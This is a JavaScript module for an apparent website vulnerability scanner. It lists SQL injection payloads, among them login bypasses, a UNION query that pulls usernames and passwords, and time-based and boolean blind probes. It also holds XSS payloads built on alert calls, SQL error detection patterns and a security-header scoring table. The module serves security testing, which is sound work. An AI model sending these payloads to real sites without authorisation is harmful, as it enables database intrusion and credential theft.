/**
 * Security Testing Payloads
 * Used for testing SQL Injection and XSS vulnerabilities
 * 
 * WARNING: Only use on websites you own or have permission to test!
 */

// SQL Injection Payloads
const sqliPayloads = [
    // Basic authentication bypass
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "admin' #",
    "admin'/*",

    // Union-based injection
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT username, password FROM users--",

    // Boolean-based injection
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 AND 1=1",
    "1 AND 1=2",

    // Error-based injection
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

    // Double quotes
    "\" OR \"\"=\"",
    "\" OR \"1\"=\"1",

    // Parentheses bypass
    "') OR ('1'='1",
    "') OR ('1'='1'--",

    // Comment variations
    "' OR 1=1#",
    "' OR 1=1-- -",

    // NULL byte
    "admin'%00",

    // Stacked queries (might cause issues - use carefully)
    "'; SELECT * FROM users--",
];

// Boolean-based blind SQLi — paired payloads evaluated as logically true vs. false.
// A vulnerable endpoint produces different responses for each.
const sqliBooleanPairs = [
    { true: "test' AND '1'='1",    false: "test' AND '1'='2" },
    { true: "test' AND 1=1--",     false: "test' AND 1=2--" },
    { true: "test\" AND \"1\"=\"1", false: "test\" AND \"1\"=\"2" },
    { true: "test) AND (1=1--",    false: "test) AND (1=2--" },
];

// Time-based blind SQLi — {DELAY} is substituted at runtime with the configured delay in seconds.
const sqliTimePayloads = [
    "' OR SLEEP({DELAY})--",
    "'; WAITFOR DELAY '0:0:{DELAY}'--",
    "' OR pg_sleep({DELAY})--",
    "1) OR SLEEP({DELAY})--",
    "';SELECT pg_sleep({DELAY})--",
];

// SQL error patterns to detect vulnerabilities
const sqlErrorPatterns = [
    /SQL syntax.*MySQL/i,
    /Warning.*mysql_/i,
    /MySqlException/i,
    /valid MySQL result/i,
    /PostgreSQL.*ERROR/i,
    /Warning.*pg_/i,
    /valid PostgreSQL result/i,
    /Driver.* SQL[\-\_\ ]*Server/i,
    /OLE DB.* SQL Server/i,
    /SQLServer JDBC Driver/i,
    /SQLException/i,
    /Oracle error/i,
    /Oracle.*Driver/i,
    /Warning.*oci_/i,
    /Warning.*ora_/i,
    /SQLite\/JDBCDriver/i,
    /SQLite.Exception/i,
    /System.Data.SQLite.SQLiteException/i,
    /Warning.*sqlite_/i,
    /Warning.*SQLite3/i,
    /SQLITE_ERROR/i,
    /SQL error.*POS([0-9]+)/i,
    /Exception.*Informix/i,
    /You have an error in your SQL syntax/i,
    /Unclosed quotation mark/i,
    /quoted string not properly terminated/i,
];

// XSS Payloads
const xssPayloads = [
    // Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",

    // Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",

    // Attribute injection
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"><img src=x onerror=alert('XSS')>",
    "' onclick=alert('XSS')//",
    "\" onclick=alert('XSS')//",

    // JavaScript protocol
    "javascript:alert('XSS')",
    "javascript:alert(1)",

    // Data URI
    "<a href=\"data:text/html,<script>alert('XSS')</script>\">click</a>",

    // SVG-based
    "<svg/onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",

    // Iframe injection
    "<iframe src=\"javascript:alert('XSS')\">",
    "<iframe src=javascript:alert(1)>",

    // HTML5 specific
    "<details open ontoggle=alert('XSS')>",
    "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert('XSS')\">click</maction></math>",

    // Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",

    // Template literals (modern JS)
    "${alert('XSS')}",
    "{{constructor.constructor('alert(1)')()}}",
];

// Security headers to check
const securityHeaders = [
    {
        name: 'Content-Security-Policy',
        key: 'content-security-policy',
        importance: 'high',
        description: 'Prevents XSS attacks by controlling resource loading',
        points: 8  // Reduced - many sites don't have full CSP
    },
    {
        name: 'Strict-Transport-Security',
        key: 'strict-transport-security',
        importance: 'high',
        description: 'Forces HTTPS connections',
        points: 8
    },
    {
        name: 'X-Frame-Options',
        key: 'x-frame-options',
        importance: 'medium',
        description: 'Prevents clickjacking attacks',
        points: 5
    },
    {
        name: 'X-Content-Type-Options',
        key: 'x-content-type-options',
        importance: 'medium',
        description: 'Prevents MIME type sniffing',
        points: 5
    },
    {
        name: 'Referrer-Policy',
        key: 'referrer-policy',
        importance: 'low',
        description: 'Controls referrer information sent with requests',
        points: 2
    },
    {
        name: 'Permissions-Policy',
        key: 'permissions-policy',
        importance: 'medium',
        description: 'Controls browser feature permissions',
        points: 3
    },
    {
        name: 'Cross-Origin-Opener-Policy',
        key: 'cross-origin-opener-policy',
        importance: 'medium',
        description: 'Isolates browsing context to prevent cross-origin attacks',
        points: 3
    },
    {
        name: 'Cross-Origin-Resource-Policy',
        key: 'cross-origin-resource-policy',
        importance: 'low',
        description: 'Restricts which origins can load the resource',
        points: 2
    }
];

module.exports = {
    sqliPayloads,
    sqliBooleanPairs,
    sqliTimePayloads,
    sqlErrorPatterns,
    xssPayloads,
    securityHeaders
};
